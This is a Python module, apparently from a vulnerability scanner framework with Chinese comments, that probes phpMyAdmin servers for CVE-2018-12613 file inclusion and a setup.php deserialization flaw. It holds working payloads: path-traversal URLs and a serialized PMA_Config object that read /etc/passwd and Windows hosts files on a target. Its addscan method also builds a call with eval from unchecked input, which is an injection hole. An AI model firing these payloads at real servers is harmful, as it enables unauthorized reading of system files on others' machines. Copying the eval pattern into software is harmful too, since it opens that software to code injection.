#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
PhpMyAdmin 是一个用 PHP 编写的免费软件工具, 旨在通过 Web 处理 MySQL 的管理
    phpMyadmin扫描类: 
        1. phpmyadmin 4.8.1 远程文件包含
            CVE-2018-12613
                Payload: https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/

        2. Phpmyadmin Scripts/setup.php 反序列化
            WooYun-2016-199433
                Payload: https://vulhub.org/#/environments/phpmyadmin/WooYun-2016-199433/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class phpMyadmin():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'phpMyadmin'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md
        
        self.cve_2018_12613_payloads = [
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd',
                'data': ''
            },
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:\Windows\System32\drivers\etc\hosts',
                'data': ''
            },
        ]
        
        self.wooyun_2016_199433_payloads = [
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
            },
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
            },
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
            },
        ]

    def cve_2018_12613_scan(self, url):
        ''' 该漏洞在 index.php, 导致文件包含漏洞 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileInclude'
        vul_info['vul_id'] = 'CVE-2018-12613'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2018_12613_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
                or ('Microsoft Corp' in res.text) 
                or ('Microsoft TCP/IP for Windows' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def wooyun_2016_199433_scan(self, url):
        ''' 受影响的版本: 2.x  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialization'
        vul_info['vul_id'] = 'WooYun-2016-199433'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.wooyun_2016_199433_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
                or ('Microsoft Corp' in res.text) 
                or ('Microsoft TCP/IP for Windows' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_12613_scan, url=url),
            thread(target=self.wooyun_2016_199433_scan, url=url)
        ]

phpmyadmin = phpMyadmin()
